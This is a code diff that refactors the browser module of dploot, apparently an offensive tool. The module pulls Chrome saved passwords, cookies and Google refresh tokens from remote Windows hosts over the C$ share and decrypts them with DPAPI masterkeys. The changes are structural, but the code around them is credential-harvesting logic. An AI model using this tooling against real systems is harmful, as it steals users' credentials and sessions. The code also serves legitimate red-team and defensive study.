@@ -5,16 +5,18 @@ import json
 import logging
 import tempfile
 import sqlite3
-from typing import Any, List, Tuple
+from typing import Any, List, Tuple, Callable
 from impacket.structure import Structure
 
 
+from dploot.lib.consts import FALSE_POSITIVES
 from dploot.lib.dpapi import decrypt_blob, find_masterkey_for_blob
 from dploot.lib.smb import DPLootSMBConnection
 from dploot.lib.target import Target
+from dploot.lib.masterkey import Masterkey
 from dploot.lib.crypto import decrypt_chrome_password
 from dploot.lib.utils import datetime_to_time
-from dploot.triage.masterkeys import Masterkey
+from dploot.triage import Triage
 from dataclasses import dataclass
 
 
@@ -121,16 +123,7 @@ class GoogleRefreshToken:
         print(f"[{self.browser.upper()}] GRT {self.service}:{self.token}")
 
 
-class BrowserTriage:
-    false_positive = [
-        ".",
-        "..",
-        "desktop.ini",
-        "Public",
-        "Default",
-        "Default User",
-        "All Users",
-    ]
+class BrowserTriage(Triage):
     user_google_chrome_generic_login_path = {
         "aesStateKeyPath": "Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data\\Local State",
         "loginDataPath": "Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data\\%s\\Login Data",
@@ -165,23 +158,25 @@ class BrowserTriage:
     }
 
     share = "C$"
-
+    
     def __init__(
         self,
         target: Target,
         conn: DPLootSMBConnection,
         masterkeys: List[Masterkey],
-        per_secret_callback: Any = None,
+        per_secret_callback: Callable = None,
+        false_positive: List[str] = FALSE_POSITIVES,
     ) -> None:
-        self.target = target
-        self.conn = conn
-
-        self._users = None
-        self.looted_files = {}
-        self.masterkeys = masterkeys
-
-        self.per_secret_callback = per_secret_callback
-
+        super().__init__(
+            target, 
+            conn, 
+            masterkeys=masterkeys, 
+            per_loot_callback=per_secret_callback, 
+            false_positive=false_positive
+        )
+        
+        self._users: List[str] = None
+    
     def triage_browsers(
         self, gather_cookies: bool = False, bypass_shared_violation: bool = False
     ) -> Tuple[List[LoginData], List[Cookie]]:
@@ -312,8 +307,8 @@ class BrowserTriage:
                                 password=password,
                             )
                             credentials.append(login_data_decrypted)
-                            if self.per_secret_callback is not None:
-                                self.per_secret_callback(login_data_decrypted)
+                            if self.per_loot_callback is not None:
+                                self.per_loot_callback(login_data_decrypted)
                     fh.close()
                 if gather_cookies:
                     for cookiepath in paths["cookiesDataPath"]:
@@ -371,8 +366,8 @@ class BrowserTriage:
                                         last_access_utc=last_access_utc,
                                     )
                                     cookies.append(cookie)
-                                    if self.per_secret_callback is not None:
-                                        self.per_secret_callback(cookie)
+                                    if self.per_loot_callback is not None:
+                                        self.per_loot_callback(cookie)
                             fh.close()
                 webData_bytes = self.conn.readFile(
                     shareName=self.share,
@@ -401,8 +396,8 @@ class BrowserTriage:
                                 winuser=user, browser=browser, service=service, token=token
                             )
                             credentials.append(google_refresh_token)
-                            if self.per_secret_callback is not None:
-                                self.per_secret_callback(google_refresh_token)
+                            if self.per_loot_callback is not None:
+                                self.per_loot_callback(google_refresh_token)
         return credentials, cookies
 
     @property
